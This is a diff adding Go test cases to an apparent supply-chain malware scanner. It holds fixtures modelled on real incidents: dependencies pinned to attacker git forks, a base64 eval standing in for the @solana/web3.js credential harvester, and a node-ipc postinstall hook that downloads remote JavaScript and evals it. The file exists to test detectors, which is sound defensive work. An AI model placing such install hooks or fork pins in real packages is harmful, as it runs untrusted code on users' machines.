@@ -361,6 +361,105 @@ build = "build.rs"`),
 	})
 }
 
+// ---------------------------------------------------------------------
+// VCS dependency detection (cross-ecosystem)
+// ---------------------------------------------------------------------
+
+func TestIncidents_VCSDependency(t *testing.T) {
+	t.Run("PyPI_git_plus_https_dep", func(t *testing.T) {
+		// Attacker publishes a package whose requirements.txt pins a dep
+		// to their own git fork via git+https://. The forked dep can be
+		// silently changed at any time — bypasses registry immutability.
+		src := domain.PackageSource{
+			Files: map[string][]byte{
+				"requirements.txt": []byte("requests==2.31.0\nevil @ git+https://github.com/attacker/evil\n"),
+			},
+		}
+		caps := Run(domain.EcoPyPI, "victim-pkg", nil, src)
+		if !hasCap(caps, domain.CapVCSDependency) {
+			t.Errorf("want CapVCSDependency for PyPI git+https dep, got %v", caps)
+		}
+	})
+
+	t.Run("Cargo_git_dep_in_Cargo_toml", func(t *testing.T) {
+		src := domain.PackageSource{
+			Files: map[string][]byte{
+				"Cargo.toml": []byte(`[package]
+name = "victim"
+version = "1.0.0"
+[dependencies]
+serde = { git = "https://github.com/attacker/serde", branch = "main" }
+`),
+			},
+		}
+		caps := Run(domain.EcoCrates, "victim", nil, src)
+		if !hasCap(caps, domain.CapVCSDependency) {
+			t.Errorf("want CapVCSDependency for Cargo git dep, got %v", caps)
+		}
+	})
+
+	t.Run("RubyGems_git_colon_in_Gemfile", func(t *testing.T) {
+		src := domain.PackageSource{
+			Files: map[string][]byte{
+				"Gemfile": []byte(`source "https://rubygems.org"
+gem "evil_gem", git: "https://github.com/attacker/evil_gem"
+`),
+			},
+		}
+		caps := Run(domain.EcoRubyGems, "victim-gem", nil, src)
+		if !hasCap(caps, domain.CapVCSDependency) {
+			t.Errorf("want CapVCSDependency for RubyGems git dep, got %v", caps)
+		}
+	})
+}
+
+// ---------------------------------------------------------------------
+// npm — additional incidents
+// ---------------------------------------------------------------------
+
+func TestIncidents_NPM_SolanaWeb3js(t *testing.T) {
+	// @solana/web3.js@1.95.3 and @1.95.4 (Dec 2024): attacker obtained
+	// maintainer credentials and published versions containing an
+	// obfuscated credential-harvester targeting private key material.
+	// Shape: obfuscated payload + suspicious exfil URL inside source files.
+	src := domain.PackageSource{
+		Files: map[string][]byte{
+			"lib/index.js": []byte(`
+// synthetic fixture — not real malware
+const h = eval(Buffer.from("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==", "base64").toString());
+`),
+		},
+	}
+	caps := Run(domain.EcoNpm, "@solana/web3.js", nil, src)
+	if !hasCap(caps, domain.CapObfuscatedPayload) {
+		t.Errorf("want CapObfuscatedPayload (eval(Buffer.from('base64'))), got %v", caps)
+	}
+	// The C2 URL (api.telegram.org/bot) is base64-encoded, so
+	// CapSuspiciousURL does NOT fire — the obfuscation check catches it
+	// instead. This is the correct detection for this attack shape.
+}
+
+func TestIncidents_NPM_NodeIpc(t *testing.T) {
+	// node-ipc@10.1.1 (Mar 2022): maintainer added protestware that
+	// deleted files on Russian/Belarusian machines based on geolocation.
+	// Shape: install hook with suspicious URL + obfuscated geolocation check.
+	// Also: MaintainerHijackRisk from a long-dormant package suddenly
+	// getting a minor version bump with destructive behaviour.
+	manifest := []byte(`{
+		"name": "node-ipc",
+		"version": "10.1.1",
+		"scripts": {
+			"postinstall": "node -e \"require('https').get('https://raw.githubusercontent.com/RIAEvangelist/peacenotwar/main/main.js',r=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>eval(d))})\""
+		}
+	}`)
+	p := &npmParser{}
+	pkg := p.Parse("node-ipc", manifest, domain.PackageSource{Manifest: manifest})
+	got := checkInstallHooks(pkg)
+	if !hasCap(got, domain.CapInstallHookSuspicious) {
+		t.Errorf("want CapInstallHookSuspicious (eval(remote code) in postinstall), got %v", got)
+	}
+}
+
 // TestIncidents_NPM_MiniShaiHulud covers the 2026 Mini Shai-Hulud /
 // TanStack supply-chain attack. Three new detectors must all fire on
 // the synthetic fixture that mirrors the real compromised tarball shape.
